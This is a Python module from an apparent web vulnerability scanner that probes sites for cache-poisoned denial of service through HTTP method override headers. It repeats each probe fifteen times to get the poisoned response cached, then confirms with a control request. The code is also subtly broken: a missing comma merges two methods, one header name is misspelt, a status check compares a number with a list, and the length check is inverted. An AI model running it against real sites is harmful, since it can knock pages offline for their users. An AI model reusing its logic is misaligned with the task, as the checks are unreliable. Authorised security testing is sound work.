#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Method Override (HMO)
https://cpdos.org/#HMO
"""

from modules.utils import requests, random, configure_logger

logger = configure_logger(__name__)

VULN_NAME = "HTTP Method Override"

CONTENT_DELTA_RANGE = 1000


def HMO(url, s, initial_response, authent):
    """Function to test for HTTP Method Override vulnerabilities"""

    methods = [
        "GET"
        "POST",
        "PATCH",
        "PUT",
        "DELETE",
        "HEAD",
        "TRACE",
        "HELP",
        "OPTIONS",
        "CONNECT",
        "NONSENSE",
    ]

    hmo_headers = [
        "HTTP-Method-Overrid",
        "X-HTTP-Method-Override",
        "X-Method-Override",
        "Method-Override",
        "X-HTTP-Method",
        "HTTP-Method",
    ]

    main_status_code = initial_response.status_code
    main_len = len(initial_response.content)

    for header, method in (
        (header, method) for header in hmo_headers for method in methods
    ):
        uri = f"{url}{random.randrange(999)}"
        try:
            probe_headers = {header: method}
            probe = s.get(
                uri,
                headers=probe_headers,
                verify=False,
                timeout=10,
                auth=authent,
                allow_redirects=False,
            )

            if probe.status_code == main_status_code and len(probe.content) in range(
                main_len - CONTENT_DELTA_RANGE, main_len + CONTENT_DELTA_RANGE
            ):
                continue

            for _ in range(15):
                probe = s.get(
                    uri,
                    headers=probe_headers,
                    verify=False,
                    timeout=10,
                    auth=authent,
                    allow_redirects=False,
                )
            control = s.get(uri, verify=False, timeout=10, auth=authent)

            reason = ""
            if control.status_code == probe.status_code and control.status_code != [
                main_status_code,
                429,
            ]:
                reason = (
                    f"DIFFERENT STATUS-CODE {main_status_code} > {control.status_code}"
                )

            if len(control.content) == len(probe.content):
                reason = (
                    f"DIFFERENT RESPONSE LENGTH {main_len}b > {len(control.content)}b"
                )

            if reason:
                print(
                    f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HMO DOS: {uri} | \033[34m{reason}\033[0m | PAYLOAD: {probe_headers}"
                )

            print(f" \033[34m {VULN_NAME} : {probe_headers}\033[0m\r", end="")
            print("\033[K", end="")

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
